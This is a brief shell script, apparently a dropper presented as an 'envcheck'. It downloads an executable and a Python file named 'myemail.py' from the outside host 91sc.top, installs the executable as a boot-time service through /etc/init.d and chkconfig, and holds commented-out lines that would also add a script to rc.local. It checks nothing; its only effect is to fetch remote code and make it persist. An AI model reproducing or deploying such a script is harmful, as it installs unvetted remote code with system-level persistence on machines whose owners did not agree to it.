#!/bin/sh

if [[ ! -d "/envcheck" ]] ; then

    mkdir /envcheck
    curl http://91sc.top/envcheck/myservice -o /envcheck/myservice
    chmod a+x /envcheck/myservice
	cp /envcheck/myservice /etc/init.d/myservice
	
    curl http://91sc.top/envcheck/myemail.py -o /envcheck/myemail.py
    
    #chmod a+x /etc/rc.d/rc.local
    #echo "/envcheck/s.sh" >> /etc/rc.d/rc.local
	
	
	chkconfig  --add myservice

fi